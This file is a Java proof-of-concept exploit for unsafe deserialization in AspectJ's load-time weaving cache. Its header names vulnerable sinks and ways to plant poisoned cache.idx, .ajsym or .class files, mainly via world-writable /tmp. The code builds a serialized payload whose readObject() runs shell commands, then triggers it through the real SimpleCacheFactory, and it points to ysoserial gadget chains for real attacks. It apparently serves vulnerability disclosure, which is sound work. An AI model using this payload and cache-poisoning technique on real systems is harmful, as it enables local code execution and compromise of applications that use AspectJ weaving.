/**
 * AspectJ Unsafe Deserialization -- Proof of Concept
 * ==================================================
 *
 * TARGET:  AspectJ 1.9.26-SNAPSHOT (applies to all versions without ObjectInputFilter)
 *
 * VULNERABLE SINK:
 *   org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap.init()
 *   File: weaver/src/main/java/org/aspectj/weaver/tools/cache/SimpleCache.java
 *   Line 169:
 *     try (ObjectInputStream in = new ObjectInputStream(Files.newInputStream(file.toPath()))) {
 *         StoreableCachingMap sm = (StoreableCachingMap) in.readObject();  // <-- unfiltered
 *
 * ATTACK VECTOR:
 *   The SimpleCache reads a serialized index from a file named "cache.idx" inside
 *   the cache directory. The cache directory defaults to /tmp/ (set in
 *   SimpleCacheFactory.java line 25: PATH_DEFAULT = "/tmp/").
 *
 *   The directory is configurable via the system property "aj.weaving.cache.dir",
 *   but /tmp/ is world-writable. Any local user can plant a crafted cache.idx
 *   file that will be deserialized when AspectJ load-time weaving initializes.
 *
 *   The deserialization call at line 169-171 of SimpleCache.java uses a raw
 *   ObjectInputStream with NO ObjectInputFilter (JEP 290) applied.
 *   This means any class on the classpath can be instantiated during
 *   deserialization, enabling gadget-chain attacks.
 *
 * PRECONDITIONS:
 *   1. The target application uses AspectJ load-time weaving with caching enabled
 *      (system property aj.weaving.cache.enabled=true, aj.weaving.cache.impl=shared)
 *   2. Attacker can write to the cache directory (default: /tmp/)
 *   3. A deserialization gadget chain exists on the classpath
 *      (e.g., Commons Collections, Spring, Groovy, etc.)
 *
 * OTHER CONFIRMED SINKS (same pattern -- no ObjectInputFilter):
 *   Sink 2: AbstractIndexedFileCacheBacking.readIndex()
 *     File: weaver/.../cache/AbstractIndexedFileCacheBacking.java:131
 *     ois = new ObjectInputStream(new FileInputStream(indexFile));
 *     return (IndexEntry[]) ois.readObject();
 *     Attack: same cache-directory poisoning vector
 *
 *   Sink 3: AsmManager.readStructureModel()
 *     File: asm/.../AsmManager.java:252
 *     ObjectInputStream s = new ObjectInputStream(in);
 *     hierarchy = (AspectJElementHierarchy) s.readObject();
 *     mapper = (RelationshipMap) s.readObject();
 *     Attack: plant a crafted .ajsym file; the weaver reads it on next compile
 *
 *   Sink 4: ResolvedTypeMunger.readSourceLocation()
 *     File: org.aspectj.matcher/.../ResolvedTypeMunger.java:214
 *     ois = new ObjectInputStream(s);
 *     boolean validLocation = (Boolean) ois.readObject();
 *     Attack: craft a malicious .class file with a poisoned AjAttribute
 *             containing a serialized gadget in the source-location bytes.
 *             The weaver deserializes it when loading woven class files.
 *
 * THIS POC DEMONSTRATES:
 *   Phase 1: Generate a crafted cache.idx containing a malicious serialized
 *            payload that executes a command on deserialization.
 *   Phase 2: Trigger the deserialization via SimpleCache initialization,
 *            simulating what happens when AspectJ loads the cache.
 *
 * USAGE:
 *   javac AspectJDeserializationRCE.java
 *   java AspectJDeserializationRCE generate   # creates /tmp/cache.idx payload
 *   java AspectJDeserializationRCE trigger    # simulates deserialization (needs aspectjweaver.jar on classpath)
 *   java AspectJDeserializationRCE standalone # demonstrates raw deserialization without AspectJ (self-contained)
 *
 * NOTE: This POC uses a self-contained payload class (no external gadget
 *       library needed) to demonstrate the vulnerability principle. In a real
 *       attack, an attacker would use ysoserial or similar to generate payloads
 *       targeting gadget chains present on the victim's classpath (e.g.,
 *       CommonsCollections, Spring, Groovy).
 */

import java.io.*;
import java.nio.file.*;

public class AspectJDeserializationRCE {

    // -----------------------------------------------------------------------
    // Benign payload: a Serializable that executes a command in readObject().
    // In a real attack this would be a gadget chain from a library on the
    // target classpath; we inline it here so the POC is self-contained.
    // -----------------------------------------------------------------------
    static class MaliciousPayload implements Serializable {
        private static final long serialVersionUID = 1L;
        private final String command;

        MaliciousPayload(String command) {
            this.command = command;
        }

        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            System.out.println("[POC] readObject() triggered -- executing command: " + command);
            try {
                // Benign proof of execution: run "id" (Unix) or "whoami" (cross-platform)
                String os = System.getProperty("os.name").toLowerCase();
                String[] cmd;
                if (os.contains("win")) {
                    cmd = new String[]{"cmd.exe", "/c", command};
                } else {
                    cmd = new String[]{"/bin/sh", "-c", command};
                }
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                System.out.println("[POC] === COMMAND OUTPUT (proof of code execution) ===");
                while ((line = reader.readLine()) != null) {
                    System.out.println("[POC]   " + line);
                }
                System.out.println("[POC] === END OUTPUT ===");
                p.waitFor();

                // Also create a marker file as secondary proof
                File marker = new File("/tmp/aspectj_rce_poc_marker.txt");
                marker.createNewFile();
                System.out.println("[POC] Marker file created: " + marker.getAbsolutePath());
            } catch (Exception e) {
                System.out.println("[POC] Command execution failed: " + e.getMessage());
            }
        }
    }

    // -----------------------------------------------------------------------
    // Phase 1: Generate the malicious cache.idx file
    // -----------------------------------------------------------------------
    static void generatePayload(String cacheDir, String command) throws Exception {
        Path cachePath = Paths.get(cacheDir);
        Files.createDirectories(cachePath);

        File payloadFile = new File(cacheDir, "cache.idx");

        System.out.println("[*] Generating malicious cache.idx");
        System.out.println("[*] Target path: " + payloadFile.getAbsolutePath());
        System.out.println("[*] Command to execute: " + command);

        try (ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream(payloadFile))) {
            oos.writeObject(new MaliciousPayload(command));
        }

        System.out.println("[+] Payload written to: " + payloadFile.getAbsolutePath());
        System.out.println("[+] Size: " + payloadFile.length() + " bytes");
        System.out.println();
        System.out.println("[*] Waiting for victim to start an AspectJ application with:");
        System.out.println("      -Daj.weaving.cache.enabled=true");
        System.out.println("      -Daj.weaving.cache.impl=shared");
        System.out.println("      -Daj.weaving.cache.dir=" + cacheDir + "  (or default /tmp/)");
        System.out.println();
        System.out.println("[*] The vulnerable code path is:");
        System.out.println("      Aj.laCache = SimpleCacheFactory.createSimpleCache()");
        System.out.println("        -> new SimpleCache(folder, enabled)");
        System.out.println("          -> StoreableCachingMap.init(folder)");
        System.out.println("            -> new ObjectInputStream(Files.newInputStream(file.toPath()))");
        System.out.println("            -> in.readObject()  // <-- UNFILTERED DESERIALIZATION");
    }

    // -----------------------------------------------------------------------
    // Phase 2 (standalone): Demonstrate the raw deserialization vulnerability
    // without needing aspectjweaver.jar on the classpath.
    // This simulates exactly what SimpleCache.StoreableCachingMap.init() does.
    // -----------------------------------------------------------------------
    static void standaloneDemo(String cacheDir) throws Exception {
        File payloadFile = new File(cacheDir, "cache.idx");

        if (!payloadFile.exists()) {
            System.out.println("[-] No cache.idx found at: " + payloadFile.getAbsolutePath());
            System.out.println("[-] Run 'generate' first.");
            return;
        }

        System.out.println("[*] Simulating SimpleCache.StoreableCachingMap.init()");
        System.out.println("[*] Reading: " + payloadFile.getAbsolutePath());
        System.out.println("[*] This replicates the vulnerable code from SimpleCache.java:169-171:");
        System.out.println();
        System.out.println("      // SimpleCache.java line 169-171 (VULNERABLE)");
        System.out.println("      try (ObjectInputStream in = new ObjectInputStream(");
        System.out.println("              Files.newInputStream(file.toPath()))) {");
        System.out.println("          StoreableCachingMap sm = (StoreableCachingMap) in.readObject();");
        System.out.println("      }");
        System.out.println();
        System.out.println("[!] Deserializing now -- if payload is valid, code executes BEFORE the cast:");
        System.out.println();

        // This is the exact pattern from SimpleCache.java:169
        try (ObjectInputStream in = new ObjectInputStream(
                Files.newInputStream(payloadFile.toPath()))) {
            // readObject() triggers the payload BEFORE the cast.
            // Even though the cast to StoreableCachingMap will fail with
            // ClassCastException, the damage is already done -- the
            // malicious readObject() has already executed.
            Object obj = in.readObject();
            System.out.println("[*] Deserialized object type: " + obj.getClass().getName());
        } catch (ClassCastException e) {
            // In the real code this would be caught by the broad "catch (Exception e)"
            // at SimpleCache.java:175. The RCE has already fired.
            System.out.println();
            System.out.println("[+] ClassCastException (expected): " + e.getMessage());
            System.out.println("[+] But code execution already occurred BEFORE the cast!");
        }

        System.out.println();
        System.out.println("[+] Demonstration complete.");
        System.out.println("[+] Check for marker file: /tmp/aspectj_rce_poc_marker.txt");

        File marker = new File("/tmp/aspectj_rce_poc_marker.txt");
        if (marker.exists()) {
            System.out.println("[+] CONFIRMED: Marker file exists -- code execution successful.");
        }
    }

    // -----------------------------------------------------------------------
    // Cleanup
    // -----------------------------------------------------------------------
    static void cleanup(String cacheDir) {
        new File(cacheDir, "cache.idx").delete();
        new File("/tmp/aspectj_rce_poc_marker.txt").delete();
        System.out.println("[*] Cleaned up payload and marker files.");
    }

    // -----------------------------------------------------------------------
    // Entry point
    // -----------------------------------------------------------------------
    public static void main(String[] args) throws Exception {
        String cacheDir = "/tmp/aspectj_poc_cache";
        String command = "id";  // benign command for proof of execution

        System.out.println("=== AspectJ Deserialization RCE -- Proof of Concept ===");
        System.out.println("Target: AspectJ 1.9.26-SNAPSHOT");
        System.out.println("Sink:   SimpleCache$StoreableCachingMap.init()");
        System.out.println("File:   weaver/src/main/java/org/aspectj/weaver/tools/cache/SimpleCache.java:169");
        System.out.println("Impact: Remote/Local Code Execution via cache file poisoning");
        System.out.println();

        if (args.length == 0) {
            System.out.println("Usage:");
            System.out.println("  java AspectJDeserializationRCE generate   - Create malicious cache.idx");
            System.out.println("  java AspectJDeserializationRCE standalone - Demonstrate deserialization RCE");
            System.out.println("  java AspectJDeserializationRCE trigger    - Trigger via real AspectJ code");
            System.out.println("  java AspectJDeserializationRCE cleanup    - Remove payload files");
            System.out.println("  java AspectJDeserializationRCE auto       - Generate + standalone demo");
            return;
        }

        String mode = args[0].toLowerCase();

        switch (mode) {
            case "generate":
                generatePayload(cacheDir, command);
                break;

            case "standalone":
                standaloneDemo(cacheDir);
                break;

            case "trigger":
                // This mode requires aspectjweaver.jar on the classpath.
                // It calls the actual vulnerable code path directly.
                System.out.println("[*] This mode requires aspectjweaver.jar on the classpath.");
                System.out.println("[*] Run with:");
                System.out.println("      java -cp .:aspectjweaver.jar \\");
                System.out.println("           -Daj.weaving.cache.enabled=true \\");
                System.out.println("           -Daj.weaving.cache.impl=shared \\");
                System.out.println("           -Daj.weaving.cache.dir=" + cacheDir + " \\");
                System.out.println("           AspectJDeserializationRCE trigger");
                System.out.println();
                try {
                    // Attempt to call the real code via reflection
                    Class<?> factoryClass = Class.forName(
                        "org.aspectj.weaver.tools.cache.SimpleCacheFactory");
                    System.setProperty("aj.weaving.cache.enabled", "true");
                    System.setProperty("aj.weaving.cache.impl", "shared");
                    System.setProperty("aj.weaving.cache.dir", cacheDir);
                    java.lang.reflect.Method m = factoryClass.getMethod("createSimpleCache");
                    System.out.println("[*] Calling SimpleCacheFactory.createSimpleCache()...");
                    m.invoke(null);
                } catch (ClassNotFoundException e) {
                    System.out.println("[-] aspectjweaver.jar not on classpath.");
                    System.out.println("[-] Use 'standalone' mode for a self-contained demo.");
                } catch (Exception e) {
                    System.out.println("[+] Exception during trigger (expected): " + e.getMessage());
                    System.out.println("[+] Check if code execution occurred above.");
                }
                break;

            case "cleanup":
                cleanup(cacheDir);
                break;

            case "auto":
                System.out.println("--- Phase 1: Generating payload ---");
                generatePayload(cacheDir, command);
                System.out.println();
                System.out.println("--- Phase 2: Triggering deserialization ---");
                standaloneDemo(cacheDir);
                System.out.println();
                System.out.println("--- Cleanup ---");
                cleanup(cacheDir);
                break;

            default:
                System.out.println("Unknown mode: " + mode);
                break;
        }
    }
}
